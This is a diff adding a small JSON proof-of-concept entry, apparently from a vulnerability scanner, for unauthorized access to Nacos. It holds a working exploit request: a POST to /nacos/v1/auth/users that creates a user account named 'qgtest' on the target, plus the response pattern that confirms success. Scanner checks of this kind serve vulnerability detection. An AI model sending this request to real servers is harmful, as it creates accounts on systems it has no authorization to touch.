@@ -1,0 +1,14 @@
+{
+	"name":"Nacos未授权访问",
+	"tag":"nacos",
+	"type":"other",
+	"poc":{
+		"pocGet":"/nacos/v1/auth/users",
+		"pocPost":"username=qgtest&password=qgtest",
+		"header":{
+			"Content-Type":" application/x-www-form-urlencoded"
+		},
+		"status_code":"200",
+		"pattern":"(create)"
+	}
+}
